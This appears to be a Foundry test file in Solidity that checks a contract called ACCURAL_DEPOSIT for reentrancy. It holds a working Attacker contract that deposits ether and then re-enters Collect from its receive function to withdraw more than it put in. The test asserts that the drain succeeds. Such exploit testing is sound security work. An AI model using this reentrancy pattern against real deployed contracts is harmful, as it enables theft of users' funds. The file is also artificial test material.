
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT} from "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {
    ACCURAL_DEPOSIT public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ACCURAL_DEPOSIT();
        _attacker = new Attacker(address(_contractUnderTest));

        // Configure contract so we control the LogFile and initialization
        _contractUnderTest.SetLogFile(address(new LogFileMock()));
        _contractUnderTest.Initialized();
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max);

        // Fund victim so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 2);

        // Fund attacker and test contract
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Ensure MinSum <= attackVal so Collect condition passes
        _contractUnderTest.SetMinSum(attackVal);

        // Prepare attacker: deposit into victim
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Snapshot before attack
        uint256 victimBalanceBefore = address(_contractUnderTest).balance;
        uint256 attackerBalanceBefore = address(_attacker).balance;

        // Trigger attack
        _attacker.attack(attackVal);

        uint256 victimBalanceAfter = address(_contractUnderTest).balance;
        uint256 attackerBalanceAfter = address(_attacker).balance;

        // Exploit succeeds if attacker drained more than its initial deposit
        if (
            attackerBalanceAfter > attackerBalanceBefore &&
            victimBalanceAfter + attackerBalanceAfter <
            victimBalanceBefore + attackerBalanceBefore
        ) {
            _attacker.setExploitSucceeded(true);
        }

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = ACCURAL_DEPOSIT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into victim so that Collect can be called
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // First Collect call; reentrancy will happen in receive()
        _victim.Collect(val);

        // If we managed to call Collect multiple times, mark success
        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    function setExploitSucceeded(bool value) external {
        exploitSucceeded = value;
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter Collect before balance is reduced in victim
            _victim.Collect(storedAttackVal);
        }
    }
}

contract LogFileMock {
    struct Message {
        address Sender;
        string Data;
        uint256 Val;
        uint256 Time;
    }

    Message[] public History;
    Message LastMsg;

    function AddMessage(
        address _adr,
        uint256 _val,
        string memory _data
    ) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
